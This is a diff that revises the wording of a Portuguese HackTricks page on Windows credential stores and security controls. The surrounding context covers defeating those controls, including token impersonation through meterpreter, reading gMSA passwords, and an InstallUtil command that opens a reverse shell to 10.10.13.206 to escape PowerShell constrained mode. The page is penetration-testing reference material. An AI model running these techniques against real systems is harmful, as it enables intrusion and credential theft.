@@ -10,13 +10,13 @@ Outras formas de apoiar o HackTricks:
 * Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
 * **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias **mais avançadas** do mundo.\
+Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias **mais avançadas** do mundo.\
 Obtenha Acesso Hoje:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -61,19 +61,19 @@ C:\windows\tracing
 
 ### Security Accounts Manager (SAM)
 
-Credenciais locais estão presentes neste arquivo, as senhas são criptografadas.
+Credenciais locais estão presentes neste arquivo, as senhas são hasheadas.
 
 ### Local Security Authority (LSA) - LSASS
 
-As **credenciais** (criptografadas) são **salvas** na **memória** deste subsistema por motivos de Single Sign-On.\
+As **credenciais** (hasheadas) são **salvas** na **memória** deste subsistema por motivos de Single Sign-On.\
 **LSA** administra a **política de segurança local** (política de senha, permissões de usuários...), **autenticação**, **tokens de acesso**...\
-LSA será o responsável por **verificar** as credenciais fornecidas no arquivo **SAM** (para um login local) e **comunicar-se** com o **controlador de domínio** para autenticar um usuário de domínio.
+LSA será o responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **comunicar-se** com o **controlador de domínio** para autenticar um usuário de domínio.
 
 As **credenciais** são **salvas** dentro do **processo LSASS**: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.
 
 ### Segredos LSA
 
-LSA pode salvar no disco algumas credenciais:
+LSA pode salvar em disco algumas credenciais:
 
 * Senha da conta do computador do Active Directory (controlador de domínio inacessível).
 * Senhas das contas dos serviços do Windows
@@ -88,9 +88,9 @@ LSA pode salvar no disco algumas credenciais:
 
 [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) é um Antivírus disponível no Windows 10 e Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem maneiras de **contornar essas proteções**.
 
-### Verificar
+### Verificação
 
-Para verificar o **status** do **Defender**, você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):
+Para verificar o **status** do **Defender** você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -109,7 +109,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-Para enumerá-lo, você também pode executar:
+Para enumerá-lo você também pode executar:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -120,7 +120,7 @@ sc query windefend
 ```
 ## EFS (Sistema de Arquivos Criptografados)
 
-O EFS funciona criptografando um arquivo com uma **chave simétrica** em massa, também conhecida como Chave de Criptografia de Arquivo, ou **FEK**. A FEK é então **criptografada** com uma **chave pública** associada ao usuário que criptografou o arquivo, e essa FEK criptografada é armazenada na **corrente de dados alternativa** $EFS do arquivo criptografado. Para descriptografar o arquivo, o driver do componente EFS usa a **chave privada** que corresponde ao certificado digital EFS (usado para criptografar o arquivo) para descriptografar a chave simétrica armazenada na corrente $EFS. A partir de [aqui](https://en.wikipedia.org/wiki/Encrypting_File_System).
+O EFS funciona criptografando um arquivo com uma **chave simétrica** em massa, também conhecida como Chave de Criptografia de Arquivo, ou **FEK**. A FEK é então **criptografada** com uma **chave pública** associada ao usuário que criptografou o arquivo, e essa FEK criptografada é armazenada na **transmissão de dados alternativos** $EFS do arquivo criptografado. Para descriptografar o arquivo, o driver do componente EFS usa a **chave privada** que corresponde ao certificado digital EFS (usado para criptografar o arquivo) para descriptografar a chave simétrica armazenada na transmissão $EFS. A partir [daqui](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
 Exemplos de arquivos sendo descriptografados sem o usuário solicitar:
 
@@ -131,7 +131,7 @@ Os arquivos criptografados usando este método podem ser **acessados de forma tr
 
 ### Verificar informações do EFS
 
-Verifique se um **usuário** **utilizou** este **serviço** verificando se este caminho existe: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Verifique se um **usuário** **usou** este **serviço** verificando se este caminho existe: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
 Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file>\
 Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **criptografar** e **descriptografar** todos os arquivos
@@ -142,7 +142,7 @@ Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **cri
 
 Este método requer que o **usuário vítima** esteja **executando** um **processo** dentro do host. Se esse for o caso, usando uma sessão `meterpreter`, você pode se passar pelo token do processo do usuário (`impersonate_token` do `incognito`). Ou você poderia simplesmente `migrar` para o processo do usuário.
 
-#### Conhecendo a senha do usuário
+#### Sabendo a senha do usuário
 
 {% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
 
@@ -167,7 +167,7 @@ Você pode ler esta senha com [**GMSAPasswordReader**](https://github.com/rvazar
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
-Também, confira esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um **ataque de retransmissão NTLM** para **ler** a **senha** de **gMSA**.
+Confira também esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um **ataque de retransmissão NTLM** para **ler** a **senha** de **gMSA**.
 
 ## LAPS
 
@@ -202,7 +202,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo restrito. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo restrito. Para mais informações, confira: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Política de Execução do PS
 
@@ -257,7 +257,7 @@ O SSPI será responsável por encontrar o protocolo adequado para duas máquinas
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias **mais avançadas** do mundo.\
@@ -275,6 +275,6 @@ Outras formas de apoiar o HackTricks:
 * Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
 * **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
